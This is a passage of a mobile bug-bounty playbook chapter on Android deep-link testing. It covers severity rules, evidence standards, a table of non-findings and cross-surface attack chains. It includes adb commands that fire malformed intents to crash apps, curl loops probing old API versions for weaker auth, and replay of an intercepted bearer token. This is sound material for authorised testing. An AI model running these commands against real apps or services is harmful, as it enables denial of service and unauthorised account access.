+  confirmed absence. List every location you searched.
+
+### D09-073 · A deep link that crashes the handler — and whether the session dies with it
+
+| | |
+|---|---|
+| **Severity ceiling** | Low |
+| **VRT** | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` (**P5**) — informational on its own, so **do not file it alone**; it becomes reportable only via the session-loss delta below |
+| **Attacker** | AM-02 |
+| **Applies to** | all; wildcard-host intent filters (`android:host="*"`) are the usual enabler |
+| **Maps to** | H1 **#3399016** (Nextcloud — scored **0.0**, crash only, session survived), **#3829030** (Yelp — **Low 3.3**, identical crash but the session was invalidated), **#859136** (Nextcloud, malformed-intent crash, **$0**), **#1058383** (LINE, **$0**) |
+
+- **Test:** Crash-only is worth zero. Crash-plus-logout is a paid DoS. The whole test is the second half, and
+  almost nobody does it.
+- **How:**
+  ```bash
+  adb logcat -c
+  adb shell am start -a android.intent.action.VIEW -d "https://attacker.example/f/abcdef" -n com.target.app/<handler>
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://x?p=$(python3 -c 'print("A"*100000)')" com.target.app
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://%00%00%00" com.target.app
+  adb shell am start -a android.intent.action.VIEW -d "targetapp://x?n=-2147483648" com.target.app
+  adb logcat -d -b crash | grep -A25 'FATAL EXCEPTION'
+  # THEN — the half that decides the severity:
+  adb shell monkey -p com.target.app -c android.intent.category.LAUNCHER 1
+  # is the user still logged in? is local state intact?
+  ```
+- **Proof:** The stack trace **plus** the login screen on relaunch. The delta between the two disclosed reports
+  is the whole lesson: identical crashes, `0.0` versus `Low 3.3`, decided entirely by whether the session
+  survived. If the session survives, park the crash in the graveyard and move on.
+- **Escalation:** Only file it if the session or stored state is affected, or if the crash is reachable from a
+  plain web link and is persistent (crash-on-launch). Otherwise it is P5 and costs you triage credibility.
+- **Ruled out when:** The handler catches malformed input and the app stays up — or it crashes and the session
+  survives a relaunch, which you must demonstrate rather than assume. Record the relaunch state either way.
+
+### D09-074 · Shadow API: the route's backend call is an older API version than the web app uses
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | whichever control is weakened: `broken_authentication_and_session_management.authentication_bypass` (P1), `broken_access_control.idor.*` (P1–P3), `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies). **A version difference alone is Informational** |
+| **Attacker** | AM-05, AM-01 |
+| **Applies to** | every deep-link route that results in a backend call |
+| **Maps to** | the bug-hunting corpus's shadow-API method — "a mobile app's hardcoded backend calls are frequently an OLDER API version than the current web app uses, with weaker auth, weaker rate limits, weaker input validation and more field exposure. Diff **behaviourally** across versions, not by response shape" |
+
+- **Test:** This is the highest-value structural idea for a mobile engagement, and the deep-link router is the
+  cheapest place to harvest the endpoint list because each route names its call. Take every endpoint a route
+  reaches and diff its *behaviour* against the version the current web app uses.
+- **How:**
+  ```bash
+  # harvest from the routes you traced in D09-041 (Retrofit annotation VALUES survive R8)
+  grep -rnE '@(GET|POST|PUT|DELETE|PATCH)\("' out/sources/ | sed 's/.*("\([^"]*\)").*/\1/' | sort -u > /tmp/endpoints.txt
+  wc -l /tmp/endpoints.txt
+  # probe sibling versions of the same operation
+  for v in v1 v2 v3 beta alpha internal legacy old; do
+    curl -s -o /dev/null -w "%{http_code} /api/$v/orders\n" "https://api.target.example/api/$v/orders"
+  done
+  curl -s -H "X-API-Version: 1" https://api.target.example/api/orders | head -c 400
+  curl -s -H "Accept: application/vnd.target.v1+json" https://api.target.example/api/orders | head -c 400
+  ```
+  Then diff four security-relevant behaviours for the **same operation** across versions:
+  1. **auth strength** — does v1 accept no token, an expired token, or a lower-privilege token that v2 rejects?
+  2. **rate limiting** — burst both; a missing 429 on v1 means throttling was never backported;
+  3. **input validation** — send the same oversized/injected payload to both;
+  4. **field exposure** — does v1 return internal identifiers or PII that the current version redacts?
+- **Proof:** A security regression on the old path, demonstrated with the **same request against both versions
+  side by side**, bodies diffed. `diff <(curl … v1) <(curl … v2)` — a byte-identical 200 is not a bypass.
+- **Escalation:** → D15, which owns the full API battery. File the weakened control, not the version
+  difference; the version difference is the route to it.
+- **Ruled out when:** Every sibling version of every harvested endpoint returns 404 or connection-refused, or
+  the old version enforces the same four controls as the current one — show all four comparisons, not just
+  the status codes.
+
+### D09-075 · Bound the finding by what the NEXT layer does, before you rate it
+
+| | |
+|---|---|
+| **Severity ceiling** | Support |
+| **VRT** | none — rating discipline that moves findings a whole band in both directions |
+| **Attacker** | n/a |
+| **Applies to** | every deep-link finding |
+| **Maps to** | the corpus's severity-discipline lesson (the Looker bounding case); the pre-severity gate's question 4 ("Is there an inheritance gate, signature check, audience check, or other validation still gating the chain?") |
+
+- **Test:** A weak native shell can still be defanged by the framework or server layer. Unvalidated raw-URI
+  injection is a real primitive — but if the router parses by path pattern, validates the user's instance
+  host, flags cross-instance links, and renders through a **server-minted authenticated embed URL** so the
+  attacker's host never loads, the finding is Low defence-in-depth, not High. The reverse also applies: a
+  validator that looks strict may be the only gate, and past it there is nothing.
+- **How:** Trace the injected URI all the way through, and cite the second layer explicitly.
+  ```bash
+  # Dart
+  strings -8 lib/arm64-v8a/libapp.so | grep -iE 'allowedHost|isAllowed|instanceHostname|sandbox|getAuthenticatedEmbedUrl'
+  # JS
+  grep -aiE 'allowedHosts|isTrusted|sanitizeUrl|assertOrigin' /tmp/hbc.strings
+  # Java/Kotlin second gate
+  grep -rn 'shouldOverrideUrlLoading\|onPageStarted' out/sources/ -A20 | grep -nE 'host|allow|equals\('
+  ```
+- **Proof:** The second validation layer quoted in the finding, with the sentence that states what it prevents.
+  Then rate against the *demonstrated* downstream behaviour, not the primitive.
+- **Escalation:** If the next layer does **not** validate, this is the moment to escalate to WebView load or
+  token leak — and only then.
+- **Ruled out when:** n/a — apply this to every finding in this chapter before you write a severity.
+
+### D09-076 · Prove AM-03 from the attacker app and AM-02 from a page — `adb` proves neither
+
+| | |
+|---|---|
+| **Severity ceiling** | Support |
+| **VRT** | none — the evidence rule that decides the attacker model on every finding |
+| **Attacker** | AM-02 / AM-03 (this item is how you establish which) |
+| **Applies to** | every finding in this chapter |
+| **Maps to** | repository doctrine (`docs/05-attacker-models.md`: "Report the weakest attacker that still works"); `tools/07-deeplink-sweep.sh`; Google Mobile VRP interaction tiers |
+
+- **Test:** `adb shell am start` runs as `shell`, a UID with far more privilege than any attacker in the
+  threat model. Discovery with adb is fine; **a finding proved only by adb has established nothing**. Re-prove
+  every candidate twice: once from the zero-permission probe app (AM-03) and once from a plain web page
+  (AM-02). Report the weakest attacker that still works.
+- **How:**
+  ```bash
+  # AM-03: the probe app declares NO permissions - that manifest is the evidence
+  sed -n '1,30p' attacker-app/app/src/main/AndroidManifest.xml       # screenshot the empty permission block
+  ./gradlew :app:assembleDebug && adb install -r attacker-app/app/build/outputs/apk/debug/app-debug.apk
+  # fire from the probe, not from shell
+  adb shell am start -n com.sanehunters.probe/.MainActivity --es target "targetapp://route?x=1"
+  # AM-02: from a real page in the default browser (D09-007)
+  adb shell am start -a android.intent.action.VIEW -d http://127.0.0.1:8000/d09.html -p com.android.chrome
+  adb logcat -d -s ActivityTaskManager | grep -i 'START u0.*com.target.app' | tail -5
+  ```
+- **Proof:** Three artefacts per finding: the probe app's permission-free manifest, the `ActivityTaskManager:
+  START` line naming the **caller package** (probe or browser, never `shell`), and a screen recording. If only
+  the adb path works, say so and rate the finding as unproven rather than inventing an attacker.
+- **Escalation:** Moving a finding from AM-03 to AM-02 is the single highest-value PoC decision in mobile bug
+  bounty — at Google VRP Tier 1 it is the difference between $15,000 and $150,000. Always attempt the page
+  delivery before you write.
+- **Ruled out when:** n/a — this rule applies to every finding you file from this chapter.
+
+### D09-077 · The layer-ordering trap when you replay an intercepted token
+
+| | |
+|---|---|
+| **Severity ceiling** | Support |
+| **VRT** | none — kill gate that prevents a false Critical |
+| **Attacker** | n/a |
+| **Applies to** | every interception finding whose impact claim is "and the token works" |
+| **Maps to** | the bug-hunting corpus's **LAYER-ORDERING TRAP** — "the highest-confidence false positive in the entire auth-bypass class" |
+
+- **Test:** You intercepted a token (D09-026 → D09-031) and replayed it, and the API answered
+  `400 {"message":"accountId is required"}`. That looks like you passed authentication. It very often is not:
+  many stacks run a body parser, schema filter or global sanitiser **in front of** the auth middleware, so a
+  malformed body is rejected before auth is ever consulted, and the response is indistinguishable from "auth
+  passed, validation failed".
+- **How:** Re-send with a minimal **well-formed** body before claiming anything.
+  ```bash
+  # what you did first
+  curl -s -X POST https://api.target.example/v1/resource -H "Authorization: Bearer $STOLEN" -d '{'
+  # 400 {"code":"ERR-INPUT-0001","message":"Invalid text. Only permitted characters are allowed"}   <- parser, not auth
+
+  # the control
+  curl -s -X POST https://api.target.example/v1/resource -H 'Content-Type: application/json' \
+       -H "Authorization: Bearer $STOLEN" -d '{}'
+  # 401 {"code":"ERR-AUTH-0001","message":"Not authenticated. Please log in."}                      <- auth layer is here
+
+  # and the negative control: the SAME well-formed request with NO token
+  curl -s -X POST https://api.target.example/v1/resource -H 'Content-Type: application/json' -d '{}'
+  ```
+- **Proof:** Only the well-formed pair tells you where the auth layer sits. If the error text is about **input
+  shape or character class**, you are talking to a parser. If it names a **domain field** *and* a well-formed
+  body still returns it, that is real signal. The same applies to edge layers — a WAF or CDN block is not an
+  origin response.
+- **Escalation:** n/a — this is a kill gate. Run it before every Critical claim in this chapter.
+- **Ruled out when:** n/a — mandatory before claiming that an intercepted credential authenticates.
+
+### D09-078 · False-positive discipline on the router sweep
+
+| | |
+|---|---|
+| **Severity ceiling** | Support |
+| **VRT** | none — the discipline that keeps your validity ratio |
+| **Attacker** | n/a |
+| **Applies to** | every bypass, reflection and timing claim in this chapter |
+| **Maps to** | the bug-hunting corpus's **Marker Discipline**, **Body-Diff Rule**, **Statistical-Sample Rule**, **Server-Policy-vs-State** and **Shell-Loop Ban** |
+
+- **Test:** Four specific ways a deep-link finding turns out to be nothing, and the control for each.
+  1. **Marker collision.** Your "reflected" parameter was already in the baseline. Use an 8+ character random
+     alphanumeric marker with no English word, no protocol keyword, and no dictionary token — never `test`,
+     `evil`, `attacker`, `payload`, `javascript`, `AAAA`, or your own domain — and **search the baseline
+     response for the marker before claiming reflection**. This one check kills most false reflection reports.
+  2. **Status-only bypass claim.** A 200 with a byte-identical body is not a bypass.
+  3. **Server policy mistaken for state.** A route that always rejects a scheme is not an oracle about your
+     input.
+  4. **Silent shell loops.** zsh array expansion fails silently and produces zero iterations with no error.
+- **How:**
+  ```bash
+  M=$(head -c16 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c10)
+  curl -s "https://target.example/route" > /tmp/base.html
+  grep -F "$M" /tmp/base.html && echo "MARKER ALREADY IN BASELINE - pick another"
+  # body diff, not status diff
+  diff <(curl -s "https://target.example/x") <(curl -s "https://target.example/x?bypass=1") | head
+  # count your sweep results (see D09-013) - always
+  wc -l uris.txt /tmp/d09_sweep.txt
+  ```
+  For any rate-limit or timing claim arising from a deep-link flow (for example "the magic-link endpoint has
+  no throttle"), use **n ≥ 10 interleaved trials per group**, randomised order, and require the suspect
+  group's mean to be **≥ 2σ** above the control's. Sample 100+ attempts before claiming a rate limit is
+  absent, and distinguish per-IP / per-account / per-session throttling.
+- **Proof:** The baseline-clean marker, the byte-level body diff, the distribution rather than the outlier,
+  and matching input/output counts on every sweep.
+- **Escalation:** n/a.
+- **Ruled out when:** n/a — apply before every claim.
+
+### D09-079 · Evidence standard for a deep-link finding
+
+| | |
+|---|---|
+| **Severity ceiling** | Support |
+| **VRT** | none — submission quality |
+| **Attacker** | n/a |
+| **Applies to** | every finding in this chapter |
+| **Maps to** | the bug-hunting corpus's `evidence-hygiene` §§2, 4–8 (five-screenshot pattern, HAR sanitising, the PII split); repository `docs/04-poc-and-evidence-standard.md` |
+
+- **Test:** A deep-link ATO is a state change, and a state change needs five artefacts, not one. And because
+  the PoC necessarily handles a live credential, the submission needs sanitising that a triager can still
+  verify against.
+- **How:** **The five-screenshot pattern**, all captured in one sitting with no page reloads between them
+  (reloads regenerate cookies and invalidate prior captures). Filenames `{finding-#}-step{n}-{description}.png`,
+  referenced by filename in the report body:
+  1. **Pre-state** — you are logged out / the victim's setting is X.
+  2. **The bug** — the link firing and the action succeeding with no step-up. The most important image.
+  3. **Post-state negative** — the old value no longer works.
+  4. **Post-state positive** — the new value does.
+  5. **Side effect** — the victim's inbox, showing whether any notification fired at all.
+
+  **Sanitising**, in order of preference. Method A: never capture the credential — screenshot the console, not
+  the network headers panel; drag Burp's divider down to hide the body. Method B: black-bar in an editor.
+  Method C: for HAR and terminal transcripts:
+  ```bash
+  jq '.log.entries |= map(
+    (.request.headers  |= map(if .name|ascii_downcase|IN("cookie","authorization","x-csrf-token") then .value="<REDACTED>" else . end)) |
+    (.response.headers |= map(if .name|ascii_downcase|IN("set-cookie") then .value="<REDACTED>" else . end)) |
+    (.request.cookies  |= map(.value="<REDACTED>")) |
+    (.response.cookies |= map(.value="<REDACTED>")))' in.har > out.sanitized.har
+  grep -i 'authorization\|"cookie"\|set-cookie' out.sanitized.har | head -20     # verify the redaction worked
+  ```
+  **Leave visible** what the triager needs to correlate against their logs: trace identifiers
+  (`x-request-id`, `x-datadog-trace-id`), your own attacker account's user id, JSON key names, and
+  bot-management/analytics cookies (`__cf_bm`, `_cfuvid`, `_ga`). Mask the session value, the token, the
+  victim's PII. After submission, log out and back in to rotate the session and rotate the test account's
+  password so anything visible in a screenshot is already dead.
+- **Proof:** Five numbered, cross-referenced images plus a sanitised HAR whose redaction you verified. Keep the
+  unredacted originals locally for the triager to request through the platform's private attachment system —
+  never by email.
+- **Escalation:** n/a.
+- **Ruled out when:** n/a — mandatory for every state-change finding you file.
+
+### D09-080 · Pre-severity gate, chain-filing order, and the programme's deep-link stance
+
+| | |
+|---|---|
+| **Severity ceiling** | Support |
+| **VRT** | none — the item that decides whether the chapter's work converts into paid findings |
+| **Attacker** | n/a |
+| **Applies to** | every finding in this chapter |
+| **Maps to** | the bug-hunting corpus's PRE-SEVERITY GATE, retraction discipline, and chain-filing order (`bugcrowd-reporting` §5, §8); Starbucks out-of-scope wording; Google Mobile VRP interaction tiers; Reddit's `autoVerify` exclusion; Grab's third-party-tool exclusion |
+
+- **Test:** Three gates, in order, before you submit anything from this chapter: scope, the pre-severity
+  gate run against the *claim*, and chain-filing order.
+- **How:**
+  1. **Scope.** Grep the programme policy for `deeplink`, `deep link`, `malicious app`, `user interaction`.
+     Starbucks excludes, verbatim, "Deeplink issues that require a victim user to interact with a link or
+     malicious app as part of the POC." Reddit excludes missing `autoVerify` by name. Grab excludes anything
+     "requiring installation or use of 3rd party apps/tools/plugins". Read this **before** building the PoC,
+     because it decides whether you build the web-page delivery or the stub app.
+  2. **Pre-severity gate — run it against the Critical *claim*, not the bug.** (a) Have I validated the full
+     chain to attacker-attainable impact, or only one primitive? (b) What does the attacker walk away with,
+     in one concrete sentence? (c) Have I personally reproduced the full chain end to end **at least twice**?
+     (d) Is there an inheritance gate, signature check, audience check or PKCE still gating the chain — if
+     yes, it is not Critical, it is "primitive present" at lower severity (D09-075). (e) Has the programme
+     rejected this class before?
+  3. **Chain-filing order.** File the **primitives first** so their identifiers exist, then the consumer with
+     the full ATO narrative at the chained severity, then edit each primitive to backfill the consumer's id.
+     For this chapter the usual split is: the unverified host or squattable scheme as primitive 1, the
+     missing PKCE or the router bypass as primitive 2, and the account takeover as the consumer.
+     ```markdown
+     ## Chain partners (filed as separate reports)
+     - **submission [UUID-1]** — unverified App Link host `auth.target.example`
+     - **submission [UUID-2]** — PKCE not enforced at `/oauth/token`
+     These primitives have independent fix surfaces and are filed separately per the programme's
+     "one fix = one bounty" rule.
+     ```
+     Do not paste the whole chain narrative into every primitive, do not claim each primitive is independently
+     P1, and do not ask for one combined bounty — **a chain is a severity amplifier, not a merge request**.
+     Do not file everything within minutes of each other either; triagers read a simultaneous batch as spam.
+- **Proof:** A documented pass/kill decision per finding, the policy quotation that governed the PoC design,
+  and cross-referenced identifiers in both directions.
+- **Escalation:** **Retraction discipline:** if a finding fails reproduction, document it in a retraction
+  appendix (original signal, disproving evidence, why it looked like a bug, date) rather than dropping it
+  silently — a clean report with a retraction appendix is more trustworthy than a longer one that falls apart
+  at triage. **The opposite case:** do **not** retract a confirmed finding that stopped reproducing because
+  the client patched mid-engagement — keep the timestamped pre-patch evidence and say so. The difference is
+  whether you hold pre-patch evidence.
+- **Ruled out when:** n/a — run these gates on every finding before submission.
+
+## Graveyard for this domain
+
+| Observation | Why it is not a finding | What would make it one |
+|---|---|---|
+| `android:autoVerify="true"` missing on an `https` filter | The VRT has no node for it; Reddit excludes it by name ("due to current Google limitation with AMP"); on Android 12+ the link goes to the browser rather than to a chooser | A demonstrated interception of a token-bearing link by a stub app that registers the same host (D09-027), with `pm get-app-links` showing the state |
+| `pm get-app-links` shows `legacy_failure` and nothing else was tested | Configuration observation; no attacker has done anything | The same host receiving an OAuth code, magic link or reset token in your stub app, and that artefact redeemed (D09-024, D09-031) |
+| The app registers a custom scheme | Custom schemes are universal and expected on Android; their existence is not a defect | The scheme carries a credential, code or token, and you captured it during a real flow (D09-026) |
+| A disambiguation chooser appears when you install a competing app | That is the platform working as designed; it is the *mechanism*, not the impact | The user-selectable chooser leading to your app receiving a live secret, or your app being the only handler so no chooser appears at all |
+| `android:priority="999"` in your PoC "wins" | Priority is documented as capped to 0 for `ACTION_VIEW`/`SEND`/`SENDTO`/`SEND_MULTIPLE` from a non-privileged app — the claim is refutable from the documentation (D09-032) | Report the win condition that actually applies: sole handler, chooser selection, or an existing user default |
+| A deep link crashes the app | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` is **P5**; Nextcloud #3399016 scored **0.0** | The crash invalidates the session or destroys stored state (Yelp #3829030, Low 3.3), or it is persistent crash-on-launch reachable from a plain web link (D09-073) |
+| Open redirect from a deep-link parameter, with nothing behind it | On the never-submit list as a standalone; `unvalidated_redirects_and_forwards.open_redirect.get_based` is P4 at best | The redirect target is an OAuth `redirect_uri`, or the app attaches its session headers to the redirected origin (D09-060), or the loaded origin reaches a JS bridge (D10) |
+| OAuth `client_secret` found hardcoded in the APK | Known and expected for a public client; `sensitive_data_exposure.sensitive_data_hardcoded.oauth_secret` is **P5** and the class is on the never-submit list | **PKCE non-enforcement** at the token endpoint is the reportable finding instead (D09-029) |
+| An enumerated list of schemes, hosts and paths | Inventory. Necessary, but it is the worksheet, not the report | Any row of it traced to a sink and fired (D09-041 onwards) |
+| A deep link opens an in-app screen the user could have reached anyway | No boundary crossed | The same route reached with **no session** (D09-067), with **another user's identifier** (D09-068), or performing an action with no confirmation (D09-066) |
+| `Intent.getData()` used without validation, sink unknown | Pattern-matching, not a finding; MASTG explicitly carves out apps that intentionally accept arbitrary values (a search scheme) | The traced sink: `loadUrl`, a file API, `parseUri`, a base-URL setter, or a state change |
+| A QR code containing a deep link is accepted by the scanner | Scanners accept codes; that is their function | The scanned URI reaching a sink with no confirmation that names the destination (D09-037) |
+| A deferred deep link from an attribution SDK routes the user | Attribution routing is the SDK's purpose | The SDK-supplied value reaching a privileged route or a WebView URL that the intent path validates and this path does not (D09-035) |
+| `enforceIntentFilter` absent on a pre-Android-16 target | The attribute does not exist below API 36 — its absence there is a platform limitation, not a defect | The app targets 36+ and a sibling app in the same family sets it (D09-053), or a component carries `intentMatchingFlags="none"` inside a hardened application (D09-054) |
+| "A malicious app could register this scheme" with no PoC app built | Assertion, not evidence; and it is precisely the class Starbucks and Grab exclude | The stub app installed, the real flow run, the secret captured, and the secret redeemed |
+
+## Cross-surface joins
+
+- **D09 (router) × D10 (bridge) — the single highest-yield join in mobile.** A deep link whose `url=` /
+  `web_view_url=` / `page=` parameter reaches `loadUrl` on a *bridged* WebView is the delivery half; the
+  token-returning `@JavascriptInterface` method is the payload half. Neither is filed alone. Nobody reviews
+  the deep-link route table and the bridge method inventory in the same sitting, which is exactly why the
+  Grab, Basecamp and TikTok reports exist. File the router primitive first (its id exists), then the bridge
+  finding as the consumer, then backfill (D09-080).
+- **D09 × D02/D03 (signing and manifest) — the fingerprint join.** The signer SHA-256 you capture once in
+  D02 is the input to three unrelated checks: the `assetlinks.json` comparison here (D09-015), the
+  `protectionLevel="signature"` analysis in D03/D06, and the API-key restriction check in D18. The specific
+  trap nobody joins up: with **Play App Signing** the statement may list the *upload* key, so App Links fail
+  for every real user while passing on the developer's machine (D09-016) — and the same wrong fingerprint
+  silently unrestricts a Maps or Firebase key.
+- **D09 × D01/D18 (infrastructure) — the allow-list-decay join.** The app's trusted-host list and the org's
+  DNS inventory are owned by different teams and never compared. A lapsed registration or a dangling CNAME
+  inside the allow-list (D09-056) or inside `assetlinks.json` (D09-020) converts a *correct* validator into an
+  attacker-controlled origin with the app's headers attached. Static analysis structurally cannot find this;
+  only a WHOIS/DNS sweep of the extracted host list can.
+- **D09 × D24 (push/FCM) — the notification-trust join.** Routes gated on "this came from a notification"
+  are gated on a signature whose key is often in the APK (D09-039). Join it the other way too: a notification
+  listener with the user's grant reads a deep link **and its one-time token** out of `Notification.extras`,
+  then replays the route itself. The push team and the router team each assume the other validates.
+- **D09 × D13 (OAuth) × D10 (WebView allow-list) — the three-way.** (1) An unverified deep-link host is
+  claimable by an attacker app. (2) The in-app WebView's "is this our domain" classifier accepts a lookalike.
+  (3) The OAuth `redirect_uri` allow-list accepts a path or subdomain that one of the first two controls.
+  **Any two of the three is enough**, and each is owned by a different reviewer.
+- **D09 × D23 (payments) — the sentinel join.** The transfer model's reserved strings (`(all)`, `max`,
+  negative amounts) are reviewed as a business-logic surface, while the URI router is reviewed as an IPC
+  surface. The join is whether any URI parameter reaches a reserved value with a different parser than the
+  in-app form uses (D09-069) — Monero's case exactly.
+- **D09 × D15 (backend) — the shadow-API join.** The deep-link route table is the cheapest endpoint
+  inventory in the engagement, because each route names its call. The mobile app's hardcoded backend is
+  frequently an **older API version** than the current web app's, with weaker auth, weaker rate limits and
+  more field exposure. Diff behaviourally, not by response shape; the weakened control is the finding, a
+  version difference alone is Informational (D09-074). And when you replay an intercepted token, run the
+  layer-ordering control first (D09-077).
+- **D09 × D19 (cross-platform) — the two-parser join.** In Flutter and React Native the Java shell and the
+  Dart/JS router parse the same URI with different libraries. A Java reviewer sees a validator and closes the
+  surface; a framework reviewer sees a router and assumes the native side filtered. The bug lives in the
+  disagreement (D09-047), and `flutter_deeplinking_enabled` defaulting to **true** (D09-009) means the
+  handoff exists even when the Java side appears empty.
+- **D09 × D04 (task and UI redress) — the plausibility join.** A deep link that lands an attacker-controlled
+  screen inside the victim app's *task* (via `taskAffinity`/`singleTask`) makes the phishing surface wear the
+  app's own chrome and back stack. Neither surface is interesting alone; together, a link becomes a credible
+  credential-capture screen the user cannot distinguish from the real one.
+- **D09 × D20/D25 (physical and ambient delivery).** QR stickers (D09-037) and NFC tags (D09-038) deliver the
+  *same* router payload to a victim who would never tap a link — and from Android 16 an `http(s)` NFC tag
+  reaches ordinary App Link filters with no NFC declaration at all. The router review and the "do we have a
+  scanner?" question are never asked together.
+
+## Sources
+
+- **OWASP MASTG/MASWE** (`primary/owasp-mastg.md`, `primary/owasp-mobile-top10.md`): MASTG-TEST-0028,
+  MASTG-TEST-0393, MASTG-TEST-0394; MASTG-TECH-0172/-0173/-0174 (including the verbatim `pm get-app-links`
+  output shape, the "Common Reasons Verification Fails" list and the `<data>` merge worked example);
+  MASTG-KNOW-0019 ("Unlike iOS, Android provides no mechanism to identify which app sent the Intent"; the
+  pre-12 verification-poisoning rule); MASTG-BEST-0070/-0071; MASTG-TOOL-0032; MASTG-DEMO-0152; the semgrep
+  rules `mastg-android-deeplink-autoverify-missing`, `mastg-android-deeplink-unvalidated-parameter`,
+  `mastg-android-custom-deeplink-scheme`; MASWE-0029, MASWE-0018, MASWE-0050. Identifiers cross-checked
+  against `data/mastg-android-tests.csv` and `data/mastg-android-techniques.csv`.
+- **Android platform documentation** (`architecture/framework-internals.md`, `architecture/aosp-core.md`,
+  `architecture/security-model.md`, `frontier/modern-api-surfaces.md`): `guide/topics/manifest/data-element`
+  (the `<data>` combination rule, `pathPattern` glob semantics with its three documented non-matches, host
+  wildcard and case rules, the scheme/host suppression rules); `guide/topics/manifest/intent-filter-element`
+  (the priority cap); `training/app-links/verify-android-applinks` (state vocabulary, compat id **175408749**,
+  the Android 15 seven-day propagation note); `about/versions/12/behavior-changes-12` and
+  `behavior-changes-all` (web intent resolution); `about/versions/15/features` (`UriRelativeFilterGroup`);
+  `about/versions/16/behavior-changes-16` (`intentMatchingFlags`, `allowNullAction`, the PackageManager
+  logcat filter); `develop/connectivity/nfc/nfc` (dispatch priority, AAR precedence, the Android 16
+  `http(s)`→`ACTION_VIEW` change, `ACTION_TAG_DISCOVERED` deprecated at API 37);
+  `develop/ui/views/launch/shortcuts/managing-shortcuts`; `identity/sign-in/credential-manager`;
+  `privacy-and-security/risks/{unsafe-use-of-deeplinks,unsafe-uri-loading,cross-app-scripting,intent-redirection}`;
+  AOSP `content/Intent.java` (`parseUri`, `URI_INTENT_SCHEME`, `URI_ALLOW_UNSAFE`, `URI_ANDROID_APP_SCHEME`).
+- **Disclosed reports** (`realworld/h1-disclosed-mobile.md`, `realworld/bugcrowd-intigriti-writeups.md`,
+  `secondary/writeups-realfinds.md`, `secondary/sehno-gowthams.md`): H1 #1667998 (KAYAK, Critical 9.3),
+  #1372667 (Basecamp, High 8.7, $6,337), #401793 (Grab, High 7.1 / $7,500 per Intigriti Bug Bytes #11),
+  #855618 (Shopify Arrive, Low, magic-link ATO over a Branch `app.link` domain), #532225 and #328486
+  (Zomato), #424443 (PayPal, Medium 5.4), #1087744 (Shopify, Low 3.1, the `../` pathPrefix escape),
+  #1500614 and #2417516 (TikTok, CVE-2024-45240), #3475626 (LinkedIn, High 8.1), #583987 / #805073
+  (Periscope), #2139260 (Snapchat, Medium 6.5), #2553411 (Basecamp path traversal, Medium 5.5), #3648638
+  (Monero, Medium 6.5), #3399016 (Nextcloud, 0.0) versus #3829030 (Yelp, Low 3.3), #341908, #431002
+  (referenced by Google's own VRP remediation tip).
+- **Vendor and programme economics** (`primary/vrp-program-economics.md`): Google Mobile VRP classes
+  "Incorrect URL verification" (CWE-939) and "Leaking OAuth tokens" with their auditing tips; the VRP
+  interaction tiers ($15,000 vs $150,000 vs $300,000 at Tier 1); Starbucks, Reddit and Grab out-of-scope
+  wording; Google Play ASI campaigns "Scheme Hijacking" (2018-11-15), "Intent Redirection" (2019-05-16).
+- **Community and vendor research** (`secondary/hrishikesh-hacktricks.md`, `secondary/extra-community-sources.md`,
+  `secondary/indusface-singh-riya.md`, `secondary/sallam-hetmehta.md`, `secondary/frida-drozer-tooling.md`,
+  `primary/mobilehackinglab.md`): Oversecured's deep-link and WebView checklists (the `startsWith`/`endsWith`/
+  `contains` matrix, the missing-scheme-check class, the `HierarchicalUri` bypass, the backslash `getHost()`
+  divergence at minSdk ≤ 24, the expired-allow-list-domain class); HackTricks deep-link testing and the
+  `intent://` grammar; the drozer `scanner.activity.browsable` and `app.activity.start` forms; the Frida
+  deep-link observer; Mobile Hacking Lab "Android Intent Security" Step 3 and labs `lab-guess-me`,
+  `lab-link-liar`; Liu et al., USENIX Security 2017 (two percent of deep-link apps pass full App Link
+  verification).
+- **CVE and supply-chain material** (`primary/exploitdb-cve-patterns.md`, `realworld/sdk-supplychain-cves.md`):
+  **CVE-2026-26123** (Microsoft Authenticator `ms-msa://` emitted but unregistered), **CVE-2024-45240**
+  (TikTok Lynxview, and its Android 12+ limitation), the EngageLab push-SDK `parseUri(..., URI_ALLOW_UNSAFE)`
+  class.
+- **Cross-platform** (`realworld/crossplatform-frameworks.md`, `local/skill-corpus-classes.md`,
+  `local/skill-corpus-method.md`): Flutter `FlutterActivityLaunchConfigs.java`
+  (`flutter_deeplinking_enabled` default true, `EXTRA_INITIAL_ROUTE`), the `getInitialRoute()` robust-versus-weak
+  shells and the `intentMatchingFlags` on-device result codes (`3` delivered, `-92` blocked, `102` BAL_BLOCK);
+  React Native `Linking` and the Hermes bundle; Cordova `WhitelistPlugin.java` and Capacitor `CapConfig.java`.
+- **The bug-hunting corpus** (`secondary/claude-bughunter.md`): the LAYER-ORDERING TRAP; Marker Discipline,
+  the Body-Diff Rule, the Statistical-Sample Rule, Server-Policy-vs-State and the Shell-Loop Ban; the
+  shadow-API mobile-to-backend bridge and its "a version difference alone is Informational" rule; the
+  PKCE-non-enforcement inversion against the never-submit `client_secret` item; the five-screenshot pattern,
+  HAR sanitising and the mask-versus-leave-visible split; the pre-severity gate, retraction discipline and
+  its patched-mid-engagement exception; and chain-filing order ("one fix = one bounty; a chain is a severity
+  amplifier, not a merge request").
+- **Frontier and gap analyses** (`frontier/undertested-surfaces.md`, `frontier/api-and-server-side.md`,
+  `gaps-gap-coverage.md`, `gaps-gap-adversary.md`, `gaps-gap-workflow.md`): the per-browser `intent://`
+  capability matrix; NFC as a deep-link delivery vector; deferred deep links and `INSTALL_REFERRER` as
+  unauthenticated router inputs; ML Kit barcode scanning as a physical entry point; pinned-shortcut and
+  instant-app route remnants; RFC 8252 and draft-ietf-oauth-security-topics on private-use URI schemes and
+  PKCE; the Play App Signing upload-key-versus-app-signing-key trap.
+- **Repository doctrine**: `docs/02-severity-and-reportability.md` (the P5 mobile branch and the `null`-priority
+  rule), `docs/05-attacker-models.md` (AM-02/AM-03 and "report the weakest attacker that still works"),
+  `docs/04-poc-and-evidence-standard.md`, `tools/04-applink-verify.sh`, `tools/07-deeplink-sweep.sh`,
+  `attacker-app/` (the permission-free probe manifest that establishes AM-03), and
+  `data/bugcrowd-vrt-full.csv` (Bugcrowd VRT release 2026-07-08, 581 entries — every VRT path in this chapter
+  was checked against it).
